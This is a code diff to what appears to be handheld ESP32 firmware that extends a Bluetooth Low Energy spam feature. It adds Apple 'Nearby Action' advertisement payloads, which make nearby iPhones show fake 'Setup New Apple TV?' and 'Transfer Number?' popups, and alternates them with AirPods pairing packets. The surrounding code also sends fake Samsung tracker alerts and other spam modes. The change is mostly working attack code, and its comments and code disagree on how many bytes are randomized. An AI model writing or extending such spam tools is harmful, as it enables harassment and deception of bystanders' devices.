@@ -29285,6 +29285,12 @@ static const uint8_t s_apple_payloads[][24] = {
 };
 #define APPLE_PAYLOAD_COUNT (int)(sizeof(s_apple_payloads)/sizeof(s_apple_payloads[0]))
 
+// Apple Nearby Action (0x04,0x04,0x2A) — triggers "Setup New Apple TV?", "Transfer Number?" popups
+// Format: 0x4C,0x00, 0x04,0x04,0x2A, <action_byte>, 0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00
+// Last 3 bytes randomized per cycle; action_byte rotates through list
+static const uint8_t s_apple_nearby_actions[] = {0x27,0x09,0x02,0x1e,0x2b,0x2d,0x2f,0x01,0x06,0x20,0xc0};
+#define APPLE_NEARBY_ACTION_COUNT (int)(sizeof(s_apple_nearby_actions)/sizeof(s_apple_nearby_actions[0]))
+
 // Samsung Galaxy Watch (company ID 0x0075) — triggers "Unknown Tracker" alert on Samsung phones
 // Format: 0x75,0x00, 0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43, <watch_model>
 static const uint8_t s_samsung_payloads[][13] = {
@@ -29371,6 +29377,8 @@ static void ble_disc_proceed_from_sas(void)
 struct ble_spam_state_t {
     int apple_idx, samsung_idx, google_idx, windows_idx;
     int airtag_idx, smarttag_idx, sour_apple_idx;
+    int apple_nearby_action_idx;
+    int apple_packet_cycle;  // 0 = pairing, 1 = nearby action (alternates)
     int mode_round;
     bool configured;
     bool started;
@@ -29470,11 +29478,42 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
     uint8_t sa_mfg[9];
 
     switch (cur_mode) {
-    case BLE_SPAM_MODE_APPLE:
-        fields.mfg_data = s_apple_payloads[st->apple_idx];
-        fields.mfg_data_len = sizeof(s_apple_payloads[0]);
-        st->apple_idx = (st->apple_idx + 1) % APPLE_PAYLOAD_COUNT;
+    case BLE_SPAM_MODE_APPLE: {
+        // Alternate 50/50 between AirPods pairing and Apple TV/Setup nearby action
+        static uint8_t apple_nearby_payload[15];  // Reusable buffer for nearby action
+
+        if (st->apple_packet_cycle == 0) {
+            // Send pairing packet
+            fields.mfg_data = s_apple_payloads[st->apple_idx];
+            fields.mfg_data_len = sizeof(s_apple_payloads[0]);
+            st->apple_idx = (st->apple_idx + 1) % APPLE_PAYLOAD_COUNT;
+        } else {
+            // Send nearby action packet with randomized action + trailing bytes
+            uint8_t action_byte = s_apple_nearby_actions[st->apple_nearby_action_idx];
+            st->apple_nearby_action_idx = (st->apple_nearby_action_idx + 1) % APPLE_NEARBY_ACTION_COUNT;
+
+            // Build: 4C 00 04 04 2A <action> 60 4C 95 00 00 10 00 <rand3>
+            apple_nearby_payload[0] = 0x4C;
+            apple_nearby_payload[1] = 0x00;
+            apple_nearby_payload[2] = 0x04;
+            apple_nearby_payload[3] = 0x04;
+            apple_nearby_payload[4] = 0x2A;
+            apple_nearby_payload[5] = action_byte;
+            apple_nearby_payload[6] = 0x60;
+            apple_nearby_payload[7] = 0x4C;
+            apple_nearby_payload[8] = 0x95;
+            apple_nearby_payload[9] = 0x00;
+            apple_nearby_payload[10] = 0x00;
+            apple_nearby_payload[11] = 0x10;
+            apple_nearby_payload[12] = 0x00;
+            esp_fill_random(&apple_nearby_payload[13], 2);  // Random last 2 bytes
+
+            fields.mfg_data = apple_nearby_payload;
+            fields.mfg_data_len = 15;
+        }
+        st->apple_packet_cycle = (st->apple_packet_cycle + 1) % 2;
         break;
+    }
     case BLE_SPAM_MODE_SAMSUNG:
         fields.mfg_data = s_samsung_payloads[st->samsung_idx];
         fields.mfg_data_len = sizeof(s_samsung_payloads[0]);
@@ -29592,6 +29631,8 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
         ble_spam_active = true;
         // Reset payload indices only; keep configured/started to avoid reconfigure on persisted instance
         g_ble_spam_state.apple_idx = 0;
+        g_ble_spam_state.apple_nearby_action_idx = 0;
+        g_ble_spam_state.apple_packet_cycle = 0;
         g_ble_spam_state.samsung_idx = 0;
         g_ble_spam_state.google_idx = 0;
         g_ble_spam_state.windows_idx = 0;
